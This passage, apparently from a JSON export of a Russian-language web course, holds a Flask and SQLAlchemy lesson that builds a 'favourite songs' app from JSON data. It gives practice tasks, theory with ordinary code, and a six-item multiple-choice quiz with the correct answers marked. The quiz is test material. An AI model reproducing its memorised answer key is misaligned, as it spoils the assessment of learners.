список)</p></td><td style=\"border-bottom:solid windowtext 1.0pt;border-left:none;border-right:solid windowtext 1.0pt;border-top:none;mso-border-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-top-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\">Можно хранить только строки</p></td></tr><tr><td style=\"border-top:none;border:solid windowtext 1.0pt;mso-border-alt:solid windowtext .5pt;mso-border-top-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\">Удобно для логина, корзины товаров и настроек</p></td><td style=\"border-bottom:solid windowtext 1.0pt;border-left:none;border-right:solid windowtext 1.0pt;border-top:none;mso-border-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-top-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\">Ручное управление и проверка целостности</p></td></tr><tr><td style=\"border-top:none;border:solid windowtext 1.0pt;mso-border-alt:solid windowtext .5pt;mso-border-top-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\">Автоматическая работа с идентификатором сессии</p></td><td style=\"border-bottom:solid windowtext 1.0pt;border-left:none;border-right:solid windowtext 1.0pt;border-top:none;mso-border-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-top-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\">Нужно вручную создавать и проверять cookie</p></td></tr></tbody></table><p>&nbsp;</p><p><span style=\"color:black;\"><span></span></span></p>"
            },
            "is_published": true
        },
        {
            "id": 22,
            "section_id": 5,
            "number": 2,
            "name": "Приложение \"Мои любимые песни\" с базой данных и SQLAlchemy и данными в формате JSON",
            "slug": "my-love-songs",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p>Сделайте так, чтобы на главной странице был только заголовок \"Мой личный сайт\". Создайте отдельную страницу с отображением песен и соответствующий маршрут.</p><p>Измените меню навигации так, чтобы можно было переходить с главной страницы на страницу песен.</p>"
                    },
                    {
                        "id": 2,
                        "content": "<p>Вынос конфигурации приложения</p><p>Создайте отдельный файл конфигурации (config.py) и перенесите туда настройки подключения к базе данных и режим debug. Подключите конфигурацию в app.py и create_db.py.</p>"
                    },
                    {
                        "id": 3,
                        "content": "<p>Каскадное удаление связанных данных</p><p>Настройте каскадное удаление песен при удалении альбома и альбомов при удалении артиста, используя параметры cascade в relationship.</p>"
                    },
                    {
                        "id": 4,
                        "content": "<p>Уникальные ограничения на уровне базы данных</p><p>Добавьте ограничения уникальности:</p><p>имя артиста — уникально</p><p>название альбома — уникально в пределах одного артиста</p><p>номер трека — уникален в пределах одного альбома</p><p>Проверьте, как приложение реагирует на попытку сохранить дублирующиеся данные.</p>"
                    },
                    {
                        "id": 5,
                        "content": "<p>Отдельный маршрут и страница со списком артистов</p><p>Создайте маршрут /artists, который выводит список всех артистов.</p><p>Каждое имя артиста должно вести на страницу с его альбомами.</p>"
                    },
                    {
                        "id": 6,
                        "content": "<p>Усложните предыдущую задачу</p><p><span style=\"font-family:;\">Каждое имя артиста должно вести на страницу с его альбомами.</span></p>"
                    },
                    {
                        "id": 7,
                        "content": "<p>Страница альбома с песнями</p><p>Реализуйте маршрут /albums/, отображающий:</p><p>название альбома</p><p>артиста</p><p>год выпуска</p><p>список песен в правильном порядке</p>"
                    },
                    {
                        "id": 8,
                        "content": "<p>Сортировка и фильтрация песен</p><p>Добавьте возможность сортировки песен на главной странице:</p><p>по названию</p><p>по году альбома</p><p>по артисту</p><p>Реализуйте сортировку через параметры запроса (?sort=...).</p>"
                    },
                    {
                        "id": 9,
                        "content": "<p>Обработка ошибок и пользовательские страницы</p><p>Добавьте обработчики ошибок:</p><p>404 — страница не найдена</p><p>500 — ошибка сервера</p><p>Создайте для них отдельные HTML-шаблоны, наследующиеся от base.html.</p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Позволяет напрямую писать SQL-запросы к SQLite без ограничений",
                            "Обеспечивает автоматическую генерацию HTML-шаблонов из SQL-запросов",
                            "Служит прослойкой между приложением и СУБД, упрощая работу с БД ",
                            "Используется для хранения JSON-файлов в базе данных SQLAlchemy"
                        ],
                        "question": "Что является основной ролью ORM SQLAlchemy в Flask-приложении?",
                        "correct_index": 2
                    },
                    {
                        "id": 2,
                        "options": [
                            "Маршруты Flask с SQLAlchemy-запросами",
                            "JSON-объекты из файлов",
                            "Модели — специальные классы Python ",
                            "HTML-шаблоны Jinja2"
                        ],
                        "question": "Что в SQLAlchemy используется как основа для создания таблиц в базе данных?",
                        "correct_index": 2
                    },
                    {
                        "id": 3,
                        "options": [
                            "Используется как полноценная СУБД для хранения SQL-данных",
                            "Применяется для хранения шаблонов страниц в JSON формате",
                            "Заменяет ORM при работе с базой данных",
                            "Служит форматом хранения и передачи исходных данных "
                        ],
                        "question": "Какую роль выполняет JSON в данном приложении?",
                        "correct_index": 3
                    },
                    {
                        "id": 4,
                        "options": [
                            "db.session.add()",
                            "db.create_all() ",
                            "db.init_app()",
                            "db.Model.create()"
                        ],
                        "question": "Какой метод SQLAlchemy создаёт таблицы в базе данных на основе моделей?",
                        "correct_index": 1
                    },
                    {
                        "id": 5,
                        "options": [
                            "Для подключения HTML-шаблонов внутри app.app_context",
                            "Чтобы Flask знал текущую конфигурацию приложения при работе с БД ",
                            "Для автоматического запуска сервера Flask с контекстом create_db",
                            "Чтобы JSON корректно преобразовывался в Python-объекты"
                        ],
                        "question": "Зачем операции с базой данных в create_db.py выполняются внутри app.app_context()?",
                        "correct_index": 1
                    },
                    {
                        "id": 6,
                        "options": [
                            "Сохраняет данные в базу SQLite",
                            "Преобразует Python-объекты в JSON-ответ клиенту ",
                            "Читает JSON-файлы с диска",
                            "Создаёт модели SQLAlchemy в формате JSON"
                        ],
                        "question": "Какую задачу выполняет функция jsonify() во Flask?",
                        "correct_index": 1
                    }
                ],
                "theory_html": "<p><strong>Введение</strong></p><p>Для работы с базами данных в Flask удобно использовать ORM SQLAlchemy. ORM играет роль своеобразной прослойки между приложением и СУБД SQLite, и позволяет работать с базами позволяет работать с базами данных без прямого написания SQL-запросов в большинстве случаев<strong>.</strong> Надо заметить, что SQLAlchemy более гибкий и низкоуровневый по сравнению с Django ORM, но требует чуть большего понимания работы с БД.</p><p>В SQLAlchemy основой для создания таблиц в базе данных служат модели (специальные классы). Поля классов определяют структуру таблицы, которая будет использоваться для хранения информации в базе данных. В полях классов можно задавать типы данных, которые соответствуют типам данных в БД, например, String для хранения строк, Integer для целых чисел и т.д.</p><p>SQLAlchemy, как и другие ORM, очень упрощает создание связей между таблицами.</p><p>В создаваемом приложении используется связь один ко многим и внешний ключ (ForeignKey), поскольку у одного исполнителя может быть несколько альбомов, а в одном альбоме всегда будет несколько песен.</p><p>&nbsp;</p><p>Для хранения данных (артистов, альбомов, песен) в исходном виде используется формат JSON.</p><p>JSON (JavaScript Object Notation) — это простой текстовый формат хранения и передачи данных, который почти стал стандартом де-факто для backend-разработки.</p><p>Ключевая идея</p><p>JSON хранит данные в виде структур “ключ → значение”, очень похожих на словари и списки в Python. Поэтому он идеально подходит для обмена данными между клиентом (браузер, мобильное приложение) и Flask-сервером.</p><p>Структура JSON</p><p>Объект — аналог dict в Python</p><p>Массив — аналог list</p><p>Типы данных: string, number, boolean, null, объект, массив</p><p>Пример:</p><p><code>{</code></p><p><code>&nbsp; \"title\": \"Imagine\",</code></p><p><code>&nbsp; \"artist\": \"John Lennon\",</code></p><p><code>&nbsp; \"year\": 1971,</code></p><p><code>&nbsp; \"favorite\": true</code></p><p><code>}</code></p><p>Почему JSON важен для Flask-backend</p><p>Используется в REST API</p><p>Удобен для передачи данных через HTTP (GET, POST, PUT, DELETE)</p><p>Читаем человеком и легко парсится машиной</p><p>Поддерживается всеми языками и фреймворками</p><p>JSON и Flask</p><p>Во Flask JSON чаще всего используется:</p><p>для получения данных от клиента (request.json)</p><p>для ответа клиенту (jsonify())</p><p>Пример типового сценария:</p><p>фронтенд отправляет JSON с данными формы</p><p>Flask принимает JSON, обрабатывает его</p><p>Flask возвращает JSON-ответ</p><p>JSON ≠ база данных</p><p>Важно понимать:</p><p>JSON — не СУБД</p><p>это формат хранения/передачи данных</p><p>в реальных приложениях JSON обычно:</p><p>приходит от клиента</p><p>преобразуется в Python-объекты</p><p>сохраняется в базе данных (через SQLAlchemy)</p><p>Коротко:</p><p>JSON — это универсальный язык общения между клиентом и Flask-сервером.</p><p>Без него современный backend практически не существует.</p><p>&nbsp;</p><p>Для стилизации и динамических компонентов страниц используется фреймворк Bootstrap.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Создание приложения и базы данных</strong></p><p>&nbsp;</p><p>1. Создайте директорию проекта flask-songs и откройте проект в VS Code.</p><p>&nbsp;</p><p>2. Создайте и активируйте виртуальное окружение.</p><p><span style=\"color:black;\"><code>python -m venv venv</code></span></p><p><span style=\"color:black;\"><code>venv\\Scripts\\activate</code></span></p><p>&nbsp;</p><p>3. В виртуальном окружении установите <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">flask</span> и <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">flask-sqlalchemy</span></p><p><span style=\"color:#212121;font-size:14.5pt;\"><code>pip install flask flask-sqlalchemy</code></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><strong>4. Структура проекта</strong></span></p><figure class=\"image image_resized\" style=\"width:17.39%;\"><img style=\"aspect-ratio:242/365;\" src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/cc105b02-0139-4cb5-a29a-a14cf35e886d.png\" width=\"242\" height=\"365\"></figure><p>&nbsp;</p><p><strong>5. Файл в формате JSON с данными артистов, альбомов, песен.</strong></p><p>(в реальном приложении эти данные в json-формате могут прийти с API)</p><p>В директории проекта создайте файл &nbsp;<span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code>songs.json</code></span> со следующим кодом :</p><pre><code class=\"language-javascript\">{\r\n  \"artists\": [\r\n    { \"name\": \"Taylor Swift\" },\r\n    { \"name\": \"Bad Bunny\" },\r\n    { \"name\": \"The Weeknd\" },\r\n    { \"name\": \"SZA\" },\r\n    { \"name\": \"Olivia Rodrigo\" },\r\n    { \"name\": \"Billie Eilish\" },\r\n    { \"name\": \"Drake\" },\r\n    { \"name\": \"Dua Lipa\" },\r\n    { \"name\": \"Harry Styles\" },\r\n    { \"name\": \"Doja Cat\" },\r\n    { \"name\": \"Post Malone\" },\r\n    { \"name\": \"BLACKPINK\" }\r\n  ],\r\n  \"albums\": [\r\n    {\r\n      \"title\": \"Midnights\",\r\n      \"year\": \"2022\",\r\n      \"artist_name\": \"Taylor Swift\"\r\n    },\r\n    {\r\n      \"title\": \"Un Verano Sin Ti\",\r\n      \"year\": \"2022\",\r\n      \"artist_name\": \"Bad Bunny\"\r\n    },\r\n    {\r\n      \"title\": \"Dawn FM\",\r\n      \"year\": \"2022\",\r\n      \"artist_name\": \"The Weeknd\"\r\n    },\r\n    {\r\n      \"title\": \"SOS\",\r\n      \"year\": \"2023\",\r\n      \"artist_name\": \"SZA\"\r\n    },\r\n    {\r\n      \"title\": \"GUTS\",\r\n      \"year\": \"2023\",\r\n      \"artist_name\": \"Olivia Rodrigo\"\r\n    },\r\n    {\r\n      \"title\": \"Happier Than Ever\",\r\n      \"year\": \"2021\",\r\n      \"artist_name\": \"Billie Eilish\"\r\n    },\r\n    {\r\n      \"title\": \"For All the Dogs\",\r\n      \"year\": \"2023\",\r\n      \"artist_name\": \"Drake\"\r\n    },\r\n    {\r\n      \"title\": \"Future Nostalgia\",\r\n      \"year\": \"2020\",\r\n      \"artist_name\": \"Dua Lipa\"\r\n    },\r\n    {\r\n      \"title\": \"Harry's House\",\r\n      \"year\": \"2022\",\r\n      \"artist_name\": \"Harry Styles\"\r\n    },\r\n    {\r\n      \"title\": \"Scarlet\",\r\n      \"year\": \"2023\",\r\n      \"artist_name\": \"Doja Cat\"\r\n    },\r\n    {\r\n      \"title\": \"Austin\",\r\n      \"year\": \"2023\",\r\n      \"artist_name\": \"Post Malone\"\r\n    },\r\n    {\r\n      \"title\": \"BORN PINK\",\r\n      \"year\": \"2022\",\r\n      \"artist_name\": \"BLACKPINK\"\r\n    }\r\n  ],\r\n  \"songs\": [\r\n    {\r\n      \"title\": \"Anti-Hero\",\r\n      \"length\": \"3:21\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"Midnights\"\r\n    },\r\n    {\r\n      \"title\": \"Lavender Haze\",\r\n      \"length\": \"3:22\",\r\n      \"track_number\": 2,\r\n      \"album_title\": \"Midnights\"\r\n    },\r\n    {\r\n      \"title\": \"Titi Me Preguntó\",\r\n      \"length\": \"3:25\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"Un Verano Sin Ti\"\r\n    },\r\n    {\r\n      \"title\": \"Me Porto Bonito\",\r\n      \"length\": \"3:21\",\r\n      \"track_number\": 2,\r\n      \"album_title\": \"Un Verano Sin Ti\"\r\n    },\r\n    {\r\n      \"title\": \"Out of Time\",\r\n      \"length\": \"3:30\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"Dawn FM\"\r\n    },\r\n    {\r\n      \"title\": \"Sacrifice\",\r\n      \"length\": \"3:10\",\r\n      \"track_number\": 2,\r\n      \"album_title\": \"Dawn FM\"\r\n    },\r\n    {\r\n      \"title\": \"Kill Bill\",\r\n      \"length\": \"2:51\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"SOS\"\r\n    },\r\n    {\r\n      \"title\": \"vampire\",\r\n      \"length\": \"3:39\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"GUTS\"\r\n    },\r\n    {\r\n      \"title\": \"Happier Than Ever\",\r\n      \"length\": \"4:58\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"Happier Than Ever\"\r\n    },\r\n    {\r\n      \"title\": \"Search &amp; Rescue\",\r\n      \"length\": \"3:44\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"For All the Dogs\"\r\n    },\r\n    {\r\n      \"title\": \"Don't Start Now\",\r\n      \"length\": \"3:03\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"Future Nostalgia\"\r\n    },\r\n    {\r\n      \"title\": \"As It Was\",\r\n      \"length\": \"2:47\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"Harry's House\"\r\n    },\r\n    {\r\n      \"title\": \"Paint The Town Red\",\r\n      \"length\": \"3:22\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"Scarlet\"\r\n    },\r\n    {\r\n      \"title\": \"Chemical\",\r\n      \"length\": \"3:40\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"Austin\"\r\n    },\r\n    {\r\n      \"title\": \"Shut Down\",\r\n      \"length\": \"3:08\",\r\n      \"track_number\": 1,\r\n      \"album_title\": \"BORN PINK\"\r\n    }\r\n  ]\r\n}</code></pre><p>&nbsp;</p><p><strong>6. Файл с моделями данных.</strong></p><p>Из этого файла мы будем импортировать модели в главный файл приложения&nbsp;app.py&nbsp;и в скрипт&nbsp;create_db.py, который создает базу данных и заполняет её информацией.</p><p>В директории проекта создайте файл &nbsp;<span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">models.py</span> со следующим кодом:</p><pre><code class=\"language-python\">from flask_sqlalchemy import SQLAlchemy\r\n \r\ndb = SQLAlchemy()\r\n \r\nclass Artist(db.Model):\r\n  id = db.Column(db.Integer, primary_key=True)\r\n  name = db.Column(db.String(100), nullable=False)\r\n \r\nclass Album(db.Model):\r\n  id = db.Column(db.Integer, primary_key=True)\r\n  title = db.Column(db.String(100), nullable=False)\r\n  year = db.Column(db.String(4), nullable=False)\r\n  artist_id = db.Column(db.Integer, db.ForeignKey('artist.id'), nullable=False)\r\n  artist = db.relationship('Artist', backref=db.backref('albums', lazy=True))\r\n \r\nclass Song(db.Model):\r\n  id = db.Column(db.Integer, primary_key=True)\r\n  title = db.Column(db.String(100), nullable=False)\r\n  length = db.Column(db.String(4), nullable=False)\r\n  track_number = db.Column(db.Integer, nullable=False)\r\n  album_id = db.Column(db.Integer, db.ForeignKey('album.id'), nullable=False)\r\n  album = db.relationship('Album', backref=db.backref('songs', lazy=True))</code></pre><p>Объяснение:</p><p>1. Общая структура:</p><p>Файл использует Flask-SQLAlchemy: db = SQLAlchemy() — декларативный объект, от которого наследуются модели.</p><p>Каждая модель — класс, унаследованный от db.Model, соответствует таблице в базе данных (по умолчанию имя таблицы — имя класса в нижнем регистре: artist, album, song).</p><p>2. Класс Artist</p><p><code>id = db.Column(db.Integer, primary_key=True)</code></p><p>Первичный ключ, целочисленный.</p><p><code>name = db.Column(db.String(100), nullable=False)</code></p><p>Поле для имени артиста, строка максимум 100 символов, обязательно.</p><p>3. Класс Album</p><p>id — первичный ключ.</p><p><code>title = db.Column(db.String(100), nullable=False)</code></p><p>Название альбома.</p><p><code>year = db.Column(db.String(4), nullable=False)</code></p><p>Год как строка длиной 4 символа (например, \"2020\"). Можно использовать Integer, если удобнее хранить числовой год.</p><p><code>artist_id = db.Column(db.Integer, db.ForeignKey('artist.id'), nullable=False)</code></p><p>Внешний ключ, ссылается на artist.id. Обратите внимание: строка 'artist.id' использует имя таблицы (нижний регистр), а не имя класса.</p><p><code>artist = db.relationship('Artist', backref=db.backref('albums', lazy=True))</code></p><p>Отношение к объекту Artist.</p><p>backref создаёт атрибут albums на экземпляре Artist, который возвращает список связанных Album.</p><p>lazy=True означает отложенную загрузку связанных записей (при обращении к albums выполняется отдельный SELECT).</p><p>4. Класс Song</p><p>id — первичный ключ.</p><p><code>title = db.Column(db.String(100), nullable=False)</code></p><p>Название трека.</p><p><code>length = db.Column(db.String(4), nullable=False)</code></p><p>Длина трека как строка (например, \"3:45\" — но 4 символа может не покрыть все форматы). Часто удобнее хранить длительность в секундах (Integer) или в формате времени.</p><p><code>track_number = db.Column(db.Integer, nullable=False)</code></p><p>Номер трека в альбоме.</p><p><code>album_id = db.Column(db.Integer, db.ForeignKey('album.id'), nullable=False)</code></p><p>Внешний ключ на album.id.</p><p><code>album = db.relationship('Album', backref=db.backref('songs', lazy=True))</code></p><p>Отношение к Album; backref создаёт атрибут songs на Album для доступа к списку треков.</p><p><span style=\"font-size:10.0pt;\">Замечания и возможные улучшения</span></p><p><span style=\"font-size:10.0pt;\">Типы: year и length сейчас строки — рассмотреть Integer для year и Integer (секунды) или Time/Interval для length для более удобных вычислений/сортировок.</span></p><p><span style=\"font-size:10.0pt;\">Ограничения/уникальность: возможно, track_number должен быть уникален в пределах одного альбома — можно добавить составной уникальный индекс (album_id, track_number).</span></p><p><span style=\"font-size:10.0pt;\">Удаление по каскаду: при удалении альбома полезно автоматически удалять связанные песни (cascade='all, delete-orphan' на связи Album.songs).</span></p><p><span style=\"font-size:10.0pt;\">Явные&nbsp;tablename&nbsp;и&nbsp;repr&nbsp;делают модели читабельнее и удобнее при отладке.</span></p><p><span style=\"font-size:10.0pt;\">backref lazy: можно выбрать 'joined' или 'subquery' для снижения числа запросов при выборках с зависимостями.</span></p><p>&nbsp;</p><p><strong>7. Файл создания и заполнения базы данных для одноразового запуска перед стартом приложения.</strong></p><p>Создайте файл <code>create_db.p</code>y со следующим кодом :</p><pre><code class=\"language-python\">from flask import Flask\r\nimport json\r\n# Импорты моделей из файла models.py\r\nfrom models import Artist, Album, Song, db\r\n \r\napp = Flask(__name__)\r\n \r\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///music.db'\r\n \r\ndb.init_app(app)\r\n \r\nif __name__ == '__main__':\r\n  with app.app_context():\r\n    # Создаём базу данных\r\n    db.create_all()\r\n   \r\n    # Очищаем старые данные\r\n    Song.query.delete()\r\n    Album.query.delete()\r\n    Artist.query.delete()\r\n    db.session.commit()\r\n   \r\n    # загружаем данные из JSON файла\r\n    with open('songs.json', 'r', encoding='utf-8') as f:\r\n      data = json.load(f)\r\n   \r\n    # создаём исполнителей\r\n    artists_dict = {}\r\n    for artist_data in data['artists']:\r\n      artist = Artist(name=artist_data['name'])\r\n      db.session.add(artist)\r\n      artists_dict[artist_data['name']] = artist\r\n    db.session.commit()\r\n   \r\n    # создаём альбомы\r\n    albums_dict = {}\r\n    for album_data in data['albums']:\r\n      artist = artists_dict[album_data['artist_name']]\r\n      album = Album(\r\n        title=album_data['title'],\r\n        year=album_data['year'],\r\n        artist=artist\r\n      )\r\n      db.session.add(album)\r\n      albums_dict[album_data['title']] = album\r\n    db.session.commit()\r\n   \r\n    # создаём песни\r\n    for song_data in data['songs']:\r\n      album = albums_dict[song_data['album_title']]\r\n      song = Song(\r\n        title=song_data['title'],\r\n        length=song_data['length'],\r\n        track_number=song_data['track_number'],\r\n        album=album\r\n      )\r\n      db.session.add(song)\r\n   \r\n    # Фиксируем (коммитим) изменения в БД\r\n    db.session.commit()</code></pre><p>Объяснение:</p><p>Этот код наглядно демонстрирует, как именно создаются записи, и какие между ними существуют связи.</p><p>1. Импорты.</p><p><code>import json&nbsp;</code></p><p>— для чтения входного файла songs.json.</p><p><code>from models import Artist, Album, Song, db&nbsp;</code></p><p>— берутся модели и объект SQLAlchemy (db) из models.py.</p><p>2. Создание и конфигурация приложения</p><p><code>app = Flask(name)</code></p><p>— создаёт Flask‑экземпляр.</p><p><code>app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///music.db'</code></p><p>— подключение к SQLite базе (файл music.db в папке instance). Относительный путь: если запустить из другой директории, файл создастся там.</p><p><code>db.init_app(app)</code></p><p>— инициализация SQLAlchemy с ранее созданным объектом db (в&nbsp;models.py&nbsp;db = SQLAlchemy()). Такой подход (создать db отдельно и потом инициализировать) позволяет разделять конфигурацию и модели.</p><p>3. Точка входа и контекст приложения</p><p><code>if&nbsp;name&nbsp;== 'main': with app.app_context()</code></p><p>— операции с базой выполняются внутри app context, потому что SQLAlchemy использует текущий app/config и без контекста многие функции (create_all, запросы) не работают.</p><p>4. Создание схемы</p><p><code>db.create_all()</code></p><p>— создаёт таблицы согласно моделям (Artist, Album, Song). Это простая альтернатива миграциям; для продакшна обычно используют Flask‑Migrate/Alembic.</p><p>5. Очистка старых данных</p><p><code>Song.query.delete()</code></p><p><code>Album.query.delete()</code></p><p><code>Artist.query.delete()</code></p><p><code>db.session.commit()</code></p><p>Удаляются строки из таблиц. Порядок удаления важен: сначала дочерние (Song), потом Album, затем Artist — чтобы не нарушить ограничения FK.</p><p>.delete() выполняет массовое удаление на уровне SQL и не вызывает все ORM‑колбэки/каскады; при сложных зависимостях это может быть неидеально.</p><p>После удаления выполняется commit, фиксирующий изменения.</p><p>6. Чтение JSON</p><p><code>with open('songs.json', 'r', encoding='utf-8') as f: data = json.load(f)</code></p><p>Загружается структура данных, ожидаются ключи 'artists', 'albums', 'songs' (судя по коду).</p><p>7. Создание исполнителей (Artist)</p><p>Цикл по data['artists']: создаётся объект Artist(name=...), добавляется в сессию и сохраняется в artists_dict по имени.</p><p>db.session.commit() после цикла нужен, чтобы присвоить id исполнителям и гарантировать, что они доступны при создании альбомов (можно было отложить, но commit упрощает).</p><p>8. Создание альбомов (Album)</p><p>Для каждого альбома берётся</p><p><code>artist = artists_dict[album_data['artist_name']]</code></p><p>Создаётся</p><p><code>Album(title=..., year=..., artist=artist)</code></p><p>— установка artist связывает album.artist_id автоматически через relationship.</p><p>Альбомы добавляются в сессию и сохраняются в albums_dict по title; затем commit.</p><p>9. Создание песен (Song)</p><p>Для каждой песни берётся</p><p><code>album = albums_dict[song_data['album_title']]</code></p><p>Создаётся</p><p><code>Song(title=..., length=..., track_number=..., album=album)</code></p><p>— album задаёт album_id через отношение.</p><p>Песни добавляются в сессию; финальный db.session.commit() фиксирует все песни.</p><p>10. Взаимосвязь с&nbsp;models.py</p><p>В&nbsp;models.py&nbsp;есть relationship'ы: Album.artist (backref 'albums') и Song.album (backref 'songs'). Поэтому при присвоении artist=artist или album=album ORM автоматически заполнит соответствующие FK (artist_id, album_id).</p><p><span style=\"font-size:10.0pt;\">Замечания и потенциальные улучшения</span></p><p><span style=\"font-size:10.0pt;\">Отсутствует обработка ошибок: при исключении сессионная транзакция не откатывается. Рекомендуется оборачивать критичные блоки в try/except и вызывать db.session.rollback() при ошибке.</span></p><p><span style=\"font-size:10.0pt;\">Для больших наборов данных лучше использовать bulk_insert или пакеты миграций/фиков вместо create_all/delete.</span></p><p><span style=\"font-size:10.0pt;\">Путь к&nbsp;songs.json&nbsp;и music.db относительный — при запуске из VS Code убедиться, что рабочая директория — корень проекта; запуск в терминале Windows: python&nbsp;create_db.py</span></p><p><span style=\"font-size:10.0pt;\">Поле length хранится как строка длины 4 — убедиться, что формат в JSON соответствует (например \"03:45\" или \"345\").</span></p><p>&nbsp;</p><p><strong>8. Главный и запускающий файл приложения с маршрутами.</strong></p><p>Создайте файл <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">app.py</span> со следующим кодом:</p><pre><code class=\"language-python\">from flask import Flask, render_template\r\n \r\nfrom models import Artist, Album, Song, db\r\n \r\napp = Flask(__name__)\r\n \r\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///music.db'\r\n \r\n# связываем приложение и экземпляр SQLAlchemy\r\ndb.init_app(app)\r\n \r\n@app.route('/')\r\ndef index():\r\n  songs_list = Song.query.all()\r\n  return render_template('index.html', songs=songs_list)\r\n \r\nif __name__ == '__main__':\r\n  app.run(debug=True)</code></pre><p>Объяснение:</p><p><code>from flask import Flask, render_template</code></p><p>- импорт Flask и функцию для рендеринга шаблонов.</p><p><code>from models import Artist, Album, Song, db</code></p><p>- импорт моделей и экземпляра SQLAlchemy из файла models.py (ожидается, что там объявлен db = SQLAlchemy()).</p><p><code>app = Flask(name)</code></p><p>- создаётся экземпляр Flask-приложения.</p><p><code>app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///music.db'</code></p><p>- конфигурация SQLAlchemy: база SQLite в файле music.db (путь относительно рабочей директории).</p><p><code>db.init_app(app)</code></p><p>- связывает экземпляр SQLAlchemy с приложением (нужно для работы ORM вне фабрики приложений).</p><p><span style=\"color:black;\"><code>@app.route('/')</code></span></p><p><span style=\"color:black;\"><code>def index():</code></span></p><p><span style=\"color:black;\"><code>&nbsp;&nbsp;songs_list = Song.query.all()</code></span></p><p><span style=\"color:black;\"><code>&nbsp;&nbsp;return render_template('index.html', songs=songs_list)</code></span></p><p>маршрут корня (\"/\"):</p><p>- выполняется запрос ко всем объектам Song (Song.query.all()).</p><p>- результаты передаются в шаблон index.html под именем songs.</p><p>&nbsp;</p><p><strong>9. HTML шаблоны приложения.</strong></p><p>Создайте поддиректорию templates, а в ней базовый шаблон base.html с кодом:</p><pre><code class=\"language-jinja2\">&lt;!DOCTYPE html&gt;\r\n&lt;html lang=\"ru\"&gt;\r\n&lt;head&gt;\r\n  &lt;meta charset=\"UTF-8\"&gt;\r\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt;\r\n  &lt;title&gt;{% block title %}{% endblock %}&lt;/title&gt;\r\n  &lt;!-- Bootstrap стили --&gt;\r\n  &lt;link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css\" rel=\"stylesheet\"&gt;\r\n  &lt;!-- иконки fontawesome --&gt;\r\n  &lt;link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css\"&gt;\r\n  &lt;!-- кастомные стили --&gt;\r\n  &lt;link rel=\"stylesheet\" href=\"{{ url_for('static', filename='style.css') }}\"&gt;\r\n&lt;/head&gt;\r\n \r\n&lt;body&gt;\r\n  &lt;!-- навигация --&gt;\r\n  &lt;nav class=\"navbar navbar-expand-lg navbar-light bg-light\"&gt;\r\n    &lt;div class=\"container\"&gt;\r\n      &lt;a class=\"navbar-brand\" href=\"#\"&gt;Мой личный сайт&lt;/a&gt;\r\n      &lt;button class=\"navbar-toggler\" type=\"button\" \r\n              data-bs-toggle=\"collapse\" \r\n              data-bs-target=\"#navbarNav\"\r\n              aria-controls=\"navbarNav\" \r\n              aria-expanded=\"false\" \r\n              aria-label=\"Toggle \r\n              navigation\"&gt;\r\n        &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt;\r\n      &lt;/button&gt;\r\n      &lt;div class=\"collapse navbar-collapse justify-content-end\" id=\"navbarNav\"&gt;\r\n        &lt;ul class=\"navbar-nav\"&gt;\r\n          &lt;li class=\"nav-item\"&gt;\r\n            &lt;a class=\"nav-link\" href=\"/\"&gt;Главная&lt;/a&gt;\r\n          &lt;/li&gt;\r\n          &lt;li class=\"nav-item\"&gt;\r\n            &lt;a class=\"nav-link\" href=\"#\"&gt;Обо мне&lt;/a&gt;\r\n          &lt;/li&gt;\r\n        &lt;/ul&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n  &lt;/nav&gt;\r\n  &lt;!-- контент дочерних шаблонов --&gt;\r\n  &lt;div class=\"container my-3\"&gt;\r\n    {% block content %}  {% endblock %}\r\n  &lt;/div&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre><p>В коде используются css-классы фреймворка Bootstrap для стилизации, а также data-атрибуты для функционала JavaScript, для динамических компонентов.</p><p>&nbsp;</p><p>В директории templates создайте файл index.html со следующим кодом :</p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n \r\n{% block title %}\r\nМои любимые песни\r\n{% endblock %}\r\n \r\n{% block content %}\r\n&lt;h1 class=\"mb-5\"&gt;Мои любимые песни&lt;/h1&gt;\r\n&lt;div 